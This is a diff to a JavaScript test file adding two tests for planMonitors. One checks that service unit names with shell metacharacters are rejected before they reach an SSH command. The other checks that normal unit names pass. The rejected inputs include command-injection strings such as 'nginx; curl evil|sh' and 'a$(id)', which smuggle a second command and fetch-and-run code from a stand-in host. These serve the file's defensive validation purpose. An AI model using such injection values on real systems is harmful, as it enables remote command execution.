@@ -72,6 +72,19 @@ test('planMonitors：端口 / 地址非法直接抛错', () => {
   assert.throws(() => planMonitors({ ...base, http: { url: 'ftp://x/' } }), /http/)
 })
 
+test('planMonitors：单元名带 shell 元字符直接拒绝（ssh_command 会在目标机上按 shell 跑）', () => {
+  for (const unit of ['nginx; curl evil|sh', 'nginx && id', 'a$(id)', 'a`id`', 'a b', 'a>b', 'a\nb']) {
+    assert.throws(() => planMonitors({ ...base, services: [{ unit, ssh: { user: 'u', key: 'k' } }] }), /单元名只能是字母/, unit)
+  }
+})
+
+test('planMonitors：正常单元名照常通过（含 @ 与 :）', () => {
+  for (const unit of ['nginx', 'docker.service', 'getty@tty1', 'my-app:inst', 'a_b.c']) {
+    const out = planMonitors({ ...base, services: [{ unit, ssh: { user: 'u', key: 'k' } }] })
+    assert.equal(out[0].payload.ssh_command, 'systemctl is-active ' + unit)
+  }
+})
+
 /* ---------------- mergeServiceRules ---------------- */
 
 test('mergeServiceRules：同 host+unit 覆盖 monitor id，其余保留顺序，新规则追加', () => {
